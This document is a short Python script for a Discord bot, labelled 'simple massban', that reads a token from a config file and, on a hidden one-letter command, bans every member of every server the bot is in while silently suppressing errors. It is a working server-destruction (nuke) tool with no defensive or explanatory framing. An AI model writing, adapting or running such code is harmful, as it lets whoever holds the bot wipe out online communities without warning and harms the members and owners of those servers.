# simple massban 
# added config
# threading added

import discord 
from discord.ext import commands 
import json 
import os
import asyncio 

def grab_prefix():
    with open('config.json', 'r') as cfg:

        data = json.load(cfg)

        return data['prefix']

def grab_token():
    with open('config.json', 'r') as tkn:

        data = json.load(tkn)

        return data['token']

def botfunc():
    client = commands.Bot(command_prefix=grab_prefix(), intents=discord.Intents.all())

    @client.command()
    async def s(ctx):
        os.system("cls")
        for guild in client.guilds:
            asyncio.ensure_future(ban_all_members(guild))


    async def ban_all_members(guild):
        for member in guild.members:
            try:
                await member.ban()
                print(f"banned {member.display_name}")
            except:
                pass
    


    client.run(grab_token())    


if __name__ == "__main__":
    botfunc()
